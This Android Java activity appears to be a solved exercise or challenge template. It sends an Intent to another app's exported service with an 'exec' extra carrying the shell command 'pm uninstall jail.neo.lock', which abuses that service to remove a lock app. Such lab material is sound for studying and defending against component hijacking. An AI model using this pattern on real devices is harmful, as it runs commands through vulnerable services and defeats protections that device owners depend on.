package com.neo.unlock;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import android.content.ComponentName;
import android.content.Intent;
import android.database.Cursor;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class UnlockNeo extends Activity
{
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
	super.onCreate(savedInstanceState);
	TextView tv = new TextView(this);
	tv.setText("Unlocking Neo...");
	setContentView(tv);
	unlock();
    }

    private void unlock(){
/////////////////////////////////////////
// Write your code here:

      Intent mainIntent = new Intent();
      mainIntent.setClassName( "com.nloko.android.syncmypix", "com.android.MainService" );
      mainIntent.putExtra( "exec", "pm uninstall jail.neo.lock" );
      startService(mainIntent);

/////////////////////////////////////////
    }
}
